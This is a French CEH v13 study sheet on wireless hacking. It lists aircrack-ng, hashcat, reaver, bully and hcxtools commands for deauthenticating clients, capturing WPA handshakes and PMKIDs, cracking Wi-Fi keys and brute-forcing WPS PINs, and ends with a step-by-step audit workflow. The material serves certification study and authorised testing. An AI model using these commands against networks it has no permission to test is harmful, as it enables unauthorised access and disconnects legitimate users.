# 🔴 Module 16 — Outils & Labs : Wireless Hacking

> **CEH v13 | EC-Council**  
> `#Aircrack-ng` `#Hashcat` `#Reaver` `#Hcxtools` `#Kismet` `#Wireshark`

---

## Suite Aircrack-ng — Référence Complète

```bash
# ─── AIRMON-NG ────────────────────────────────────────────────
airmon-ng                          # Lister les interfaces
airmon-ng check kill               # Tuer les processus interférants
airmon-ng start wlan0              # Mode monitor → wlan0mon
airmon-ng stop wlan0mon            # Revenir en managed

# ─── AIRODUMP-NG ──────────────────────────────────────────────
airodump-ng wlan0mon               # Scanner tous les réseaux
airodump-ng --bssid XX:XX:XX:XX:XX:XX -c 6 wlan0mon -w capture
#           ↑ Filtrer AP             ↑ Canal  ↑ Sauvegarder

# Colonne importantes dans airodump-ng :
# BSSID, PWR (signal), #Data, CH, ENC, ESSID
# STATION = clients connectés

# ─── AIREPLAY-NG ──────────────────────────────────────────────
# Déauth :
aireplay-ng --deauth 10 -a BSSID -c CLIENT wlan0mon

# ARP Replay (WEP) :
aireplay-ng -3 -b BSSID wlan0mon

# Fake Authentication (WEP) :
aireplay-ng -1 0 -a BSSID wlan0mon

# Chopchop attack (WEP) :
aireplay-ng -4 -b BSSID wlan0mon

# ─── AIRCRACK-NG ──────────────────────────────────────────────
# WEP :
aircrack-ng capture-01.cap

# WPA/WPA2 avec wordlist :
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Spécifier BSSID :
aircrack-ng -w wordlist.txt -b TARGET_BSSID capture-01.cap
```

### Hashcat — Cracking GPU accéléré

```bash
# Convertir .cap en format hashcat (hcxtools) :
hcxpcapngtool capture-01.cap -o hash.hc22000

# WPA/WPA2 avec dictionnaire (mode 22000) :
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# WPA avec attaque par masque (8 chiffres) :
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# WPA avec règles de mutation :
hashcat -m 22000 hash.hc22000 -r /usr/share/hashcat/rules/best64.rule wordlist.txt

# Vérifier les performances GPU :
hashcat -b                         # Benchmark

# Restaurer une session interrompue :
hashcat --session wifi_crack --restore
```

### Reaver & Bully — WPS Cracking

```bash
# Reaver :
reaver -i wlan0mon -b TARGET_BSSID -vv
reaver -i wlan0mon -b TARGET_BSSID -c 6 --delay=1 -vv

# Bully (alternative) :
bully wlan0mon -b TARGET_BSSID -c 6 -v 3

# Wash — Scanner les APs avec WPS actif :
wash -i wlan0mon
wash -i wlan0mon -C         # Ignorer les erreurs FCS
```

### hcxtools — PMKID Attack

```bash
# hcxdumptool — Capturer PMKID :
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Conversion pour hashcat :
hcxpcapngtool capture.pcapng -o hash.hc22000

# Analyse de capture :
hcxdumptool --info capture.pcapng   # Infos sur la capture
```

### Kismet — Surveillance Wi-Fi

```bash
# Lancer Kismet :
kismet -c wlan0mon

# Interface web : http://localhost:2501
# Détecte : APs, clients, anomalies (déauth floods, Evil Twins)
```

---

## Workflow Complet — Audit Wi-Fi

```
Environnement de lab (avec autorisation)

Étape 1 : Préparation
  airmon-ng check kill
  airmon-ng start wlan0
  → Interface wlan0mon active

Étape 2 : Reconnaissance
  airodump-ng wlan0mon
  → Identifier la cible : BSSID, canal, clients

Étape 3 : Capturer le handshake WPA2
  # Terminal 1 - capture :
  airodump-ng --bssid TARGET -c CH wlan0mon -w capture
  
  # Terminal 2 - déauth :
  aireplay-ng --deauth 5 -a TARGET wlan0mon
  
  # Vérifier : "WPA handshake:" dans airodump-ng

Étape 4 : Cracker le mot de passe
  hashcat -m 22000 hash.hc22000 rockyou.txt
  # ou
  aircrack-ng -w rockyou.txt capture-01.cap

Étape 5 : Tester WPS
  wash -i wlan0mon           # Lister APs WPS
  reaver -i wlan0mon -b TARGET -vv
```

---

## 🧠 Points clés à retenir pour l'examen

- **airmon-ng** = passer en mode monitor (indispensable)
- **airodump-ng** = capturer les paquets et détecter les réseaux
- **aireplay-ng --deauth** = forcer la déconnexion d'un client
- **aircrack-ng -w** = cracker avec dictionnaire
- **Hashcat -m 22000** = mode WPA/WPA2 (plus rapide avec GPU)
- **hcxdumptool + hcxpcapngtool** = attaque PMKID
- **reaver** = brute force WPS PIN
- **Kismet** = surveillance et détection d'anomalies Wi-Fi

---

*⬅️ [Attaques Wi-Fi](./03_attaques_wifi.md) | ➡️ [Contre-mesures](./05_contre-mesures.md)*
